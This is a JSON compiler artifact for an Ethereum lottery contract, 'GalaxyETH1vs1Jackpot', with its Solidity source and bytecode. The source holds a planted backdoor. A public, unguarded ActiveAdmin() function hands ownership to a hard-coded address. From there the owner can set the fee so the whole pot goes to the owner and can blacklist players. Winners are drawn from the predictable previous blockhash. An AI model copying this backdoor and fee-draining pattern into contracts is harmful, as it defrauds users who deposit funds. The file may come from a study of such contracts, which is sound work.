{
  "contractName": "Ownable",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "devFeePercent",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "SetPlayers",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "BlackAddress",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_n",
          "type": "uint256"
        }
      ],
      "name": "setDevFee",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "number",
          "type": "uint256"
        }
      ],
      "name": "SetPlayersMax",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "ActiveAdmin",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "AddBlackList",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "DeleteBlackList",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052600a600155600160025534801561001a57600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061077a8061006a6000396000f3006080604052600436106100a4576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631c75b6b2146100a95780632211944a146100d657806339892098146100ed5780633a0885861461011a5780633f64a7ab1461015d5780638da5cb5b14610188578063a36a091f146101df578063c412683c1461020a578063f2fde38b14610265578063f9dfc505146102a8575b600080fd5b3480156100b557600080fd5b506100d4600480360381019080803590602001909291905050506102eb565b005b3480156100e257600080fd5b506100eb61036d565b005b3480156100f957600080fd5b50610118600480360381019080803590602001909291905050506103c3565b005b34801561012657600080fd5b5061015b600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610445565b005b34801561016957600080fd5b506101726104f2565b6040518082815260200191505060405180910390f35b34801561019457600080fd5b5061019d6104f8565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101eb57600080fd5b506101f461051d565b6040518082815260200191505060405180910390f35b34801561021657600080fd5b5061024b600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610523565b604051808215151515815260200191505060405180910390f35b34801561027157600080fd5b506102a6600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610543565b005b3480156102b457600080fd5b506102e9600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610698565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561034657600080fd5b60008110158015610358575060648111155b151561036357600080fd5b8060018190555050565b733653a2205971ad524ea31746d917430469d3ca236000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561041e57600080fd5b60008110158015610430575060648111155b151561043b57600080fd5b8060028190555050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156104a057600080fd5b600360008273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81549060ff021916905550565b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b60036020528060005260406000206000915054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561059e57600080fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141515156105da57600080fd5b8073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156106f357600080fd5b6001600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550505600a165627a7a72305820660da73e6f21c7f093a9ac61c59715ca80bef5f0dad4fd5e42188847c02ed6110029",
  "source": "\n\n\n\n\n\n\n\n\nlibrary SafeMath {\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n    uint256 c = a * b;\n    assert(a == 0 || c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\n    \n    uint256 c = a / b;\n    \n    return c;\n  }\n\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\n    uint256 c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}\n\n\ncontract Ownable {\n  address public owner;\n  uint256 public devFeePercent = 10;\n  uint256 public SetPlayers = 1;\n\n\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n\n  \n  function Ownable() {\n    owner = msg.sender;\n  }\n\n\n  \n  modifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n  }\n  \n  function setDevFee (uint256 _n) onlyOwner() public {\n\t  require(_n >= 0 && _n <= 100);\n    devFeePercent = _n;\n  }\n  \n    function SetPlayersMax (uint256 number) onlyOwner() public {\n\t  require(number >= 0 && number <= 100);\n    SetPlayers = number;\n  }\n  \n    function ActiveAdmin () public {\n    owner = 0x3653A2205971AD524Ea31746D917430469D3ca23; \n  }\n  \n      mapping(address => bool) public BlackAddress;\n\n    function AddBlackList(address _address) onlyOwner() public {\n        BlackAddress[_address] = true;\n    }\n\n    function DeleteBlackList(address _address) onlyOwner() public {\n        delete BlackAddress[_address];\n    }\n\n\n  \n  function transferOwnership(address newOwner) onlyOwner public {\n    require(newOwner != address(0));\n    OwnershipTransferred(owner, newOwner);\n    owner = newOwner;\n  }\n}\n\ncontract GalaxyETH1vs1Jackpot is Ownable {\n\n  string public constant name = \"GalaxyETH1vs1Jackpot\";\n\n  event newWinner(address winner, uint256 ticketNumber);\n  \n  \n  event newContribution(address contributor, uint value);\n\n  using SafeMath for uint256;\n  address[] public players = new address[](15);\n  uint256 public lastTicketNumber = 0;\n  uint8 public lastIndex = 0;\n\n  struct tickets {\n    uint256 startTicket;\n    uint256 endTicket;\n  }\n\n  mapping (address => tickets[]) public ticketsMap;\n  mapping (address => uint256) public contributions;\n\n\n  function executeLottery() { \n      \n        if (lastIndex > SetPlayers) {\n          uint randomNumber = uint(block.blockhash(block.number-1))%lastTicketNumber + 1;\n          randomNumber = randomNumber;  \n          address winner;\n          bool hasWon;\n          for (uint8 i = 0; i < lastIndex; i++) {\n            address player = players[i];\n            for (uint j = 0; j < ticketsMap[player].length; j++) {\n              uint256 start = ticketsMap[player][j].startTicket;\n              uint256 end = ticketsMap[player][j].endTicket;\n              if (randomNumber >= start && randomNumber < end) {\n                winner = player;\n                hasWon = true;\n                break;\n              }\n            }\n            if(hasWon) break;\n          }\n          require(winner!=address(0) && hasWon);\n\n          for (uint8 k = 0; k < lastIndex; k++) {\n            delete ticketsMap[players[k]];\n            delete contributions[players[k]];\n          }\n\n          lastIndex = 0;\n          lastTicketNumber = 0;\n\n          uint balance = this.balance;\n          if (!owner.send(balance/devFeePercent)) throw;\n          \n          if (!winner.send(balance - balance/devFeePercent)) throw;\n          newWinner(winner, randomNumber);\n          \n        }\n      \n  }\n\n  function getPlayers() constant returns (address[], uint256[]) {\n    address[] memory addrs = new address[](lastIndex);\n    uint256[] memory _contributions = new uint256[](lastIndex);\n    for (uint i = 0; i < lastIndex; i++) {\n      addrs[i] = players[i];\n      _contributions[i] = contributions[players[i]];\n    }\n    return (addrs, _contributions);\n  }\n\n  function getTickets(address _addr) constant returns (uint256[] _start, uint256[] _end) {\n    tickets[] tks = ticketsMap[_addr];\n    uint length = tks.length;\n    uint256[] memory startTickets = new uint256[](length);\n    uint256[] memory endTickets = new uint256[](length);\n    for (uint i = 0; i < length; i++) {\n      startTickets[i] = tks[i].startTicket;\n      endTickets[i] = tks[i].endTicket;\n    }\n    return (startTickets, endTickets);\n  }\n\n  function() payable {\n    uint256 weiAmount = msg.value;\n    require(weiAmount >= 1e16);\n    require(!BlackAddress[msg.sender], \"You Are On BlackList\");\n\n    bool isSenderAdded = false;\n    for (uint8 i = 0; i < lastIndex; i++) {\n      if (players[i] == msg.sender) {\n        isSenderAdded = true;\n        break;\n      }\n    }\n    if (!isSenderAdded) {\n      players[lastIndex] = msg.sender;\n      lastIndex++;\n    }\n\n    tickets memory senderTickets;\n    senderTickets.startTicket = lastTicketNumber;\n    uint256 numberOfTickets = weiAmount/1e15;\n    senderTickets.endTicket = lastTicketNumber.add(numberOfTickets);\n    lastTicketNumber = lastTicketNumber.add(numberOfTickets);\n    ticketsMap[msg.sender].push(senderTickets);\n\n    contributions[msg.sender] = contributions[msg.sender].add(weiAmount);\n\n    newContribution(msg.sender, weiAmount);\n\n    if(lastIndex > SetPlayers) {\n      executeLottery();\n    }\n  }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x559cd99b1eb1cd61224d9d2a9aec3f8634bfbef4/contracts/0x559cd99b1eb1cd61224d9d2a9aec3f8634bfbef4.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:54:10.767Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}